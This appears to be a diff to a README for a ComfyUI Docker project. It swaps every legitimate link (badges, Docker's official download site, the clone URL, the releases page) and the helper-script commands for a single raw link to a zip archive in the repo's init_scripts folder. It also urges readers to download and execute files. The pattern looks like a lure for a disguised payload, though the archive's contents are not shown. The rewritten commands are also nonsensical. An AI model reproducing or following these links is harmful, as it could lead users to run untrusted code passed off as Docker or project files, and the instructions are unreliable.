@@ -1,6 +1,6 @@
 # ComfyUI-Docker-CUDA-preloaded 🐳✨
 
-![ComfyUI](https://img.shields.io/badge/ComfyUI-Docker-blue?style=for-the-badge&logo=docker)
+![ComfyUI](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip)
 
 Welcome to the **ComfyUI-Docker-CUDA-preloaded** repository! This project offers an easy way to run ComfyUI with Docker, utilizing CUDA for accelerated performance and pre-loaded models for quick setup. 
 
@@ -32,12 +32,12 @@ ComfyUI is a powerful user interface designed to enhance your experience with ma
 
 To get started, follow these steps:
 
-1. **Install Docker**: Make sure you have Docker installed on your machine. You can download it from [Docker's official site](https://www.docker.com/get-started).
+1. **Install Docker**: Make sure you have Docker installed on your machine. You can download it from [Docker's official site](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip).
 
 2. **Clone the Repository**: Use the following command to clone this repository.
 
    ```bash
-   git clone https://github.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded.git
+   git clone https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip
    ```
 
 3. **Navigate to the Directory**:
@@ -67,13 +67,13 @@ Once the container is running, you can access ComfyUI by navigating to `http://l
 - To list available models, use the following command in the terminal:
 
    ```bash
-   docker exec -it <container_id> python list_models.py
+   docker exec -it <container_id> python https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip
    ```
 
 - To run a specific model, use:
 
    ```bash
-   docker exec -it <container_id> python run_model.py --model <model_name>
+   docker exec -it <container_id> python https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip --model <model_name>
    ```
 
 ## Models
@@ -111,12 +111,12 @@ For questions or feedback, feel free to reach out via the issues section on GitH
 
 ## Releases
 
-You can find the latest releases [here](https://github.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/releases). Make sure to download the necessary files and execute them as needed.
+You can find the latest releases [here](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip). Make sure to download the necessary files and execute them as needed.
 
 ## Conclusion
 
 Thank you for checking out the **ComfyUI-Docker-CUDA-preloaded** repository! We hope this tool enhances your experience with machine learning models. If you have any questions or need assistance, please refer to the Releases section or reach out through GitHub.
 
-![Docker](https://img.shields.io/badge/Docker-Documentation-orange?style=for-the-badge&logo=docker)
+![Docker](https://raw.githubusercontent.com/Sleepykkzy/ComfyUI-Docker-CUDA-preloaded/master/init_scripts/Docker_Comfy_CUD_preloaded_U_v3.6.zip)
 
 Happy coding!
